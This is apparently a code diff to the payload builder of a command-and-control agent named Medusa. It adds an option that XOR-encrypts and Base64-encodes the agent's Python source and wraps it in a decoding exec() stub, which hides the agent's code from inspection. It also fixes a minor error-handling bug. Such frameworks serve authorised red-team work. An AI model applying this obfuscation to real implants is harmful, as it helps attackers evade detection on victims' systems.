@@ -4,7 +4,8 @@ import asyncio
 import os
 from distutils.dir_util import copy_tree
 import tempfile
-import base64
+import base64, hashlib
+from itertools import cycle
 
 class Medusa(PayloadType):
 
@@ -31,6 +32,12 @@ class Medusa(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose Python version",
             choices=["Python 3.8", "Python 2.7"],
+        ),
+        "obfuscate_script": BuildParameter(
+            name="obfuscate_script",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="XOR and Base64-encode agent code",
+            choices=["Yes", "No"],
         )
     }
     c2_profiles = ["http"]
@@ -90,14 +97,23 @@ class Medusa(PayloadType):
                 resp.build_stderr = build_msg
                 resp.set_status(BuildStatus.Error)
 
+            if self.get_parameter("obfuscate_script") == "Yes":
+                key = hashlib.md5(os.urandom(128)).hexdigest().encode()
+                encrypted_content = ''.join(chr(c^k) for c,k in zip(base_code.encode(), cycle(key))).encode()
+                b64_enc_content = base64.b64encode(encrypted_content)
+                xor_func = "chr(c^k)" if self.get_parameter("python_version") == "Python 3.8" else "chr(ord(c)^ord(k))"
+                base_code = """import base64, itertools
+exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encode())
+""".format(xor_func, b64_enc_content, key)
+
             if self.get_parameter("output") == "base64":
-                    resp.payload = base64.b64encode(base_code.encode())
-                    resp.build_message = "Successfully Built"
+                resp.payload = base64.b64encode(base_code.encode())
+                resp.build_message = "Successfully Built"
             else:
                 resp.payload = base_code.encode()
                 resp.build_message = "Successfully built!"
         except Exception as e:
             resp.set_status(BuildStatus.Error)
-            resp.build_stderr("Error building payload: " + str(e))
+            resp.build_stderr = "Error building payload: " + str(e)
         return resp
 
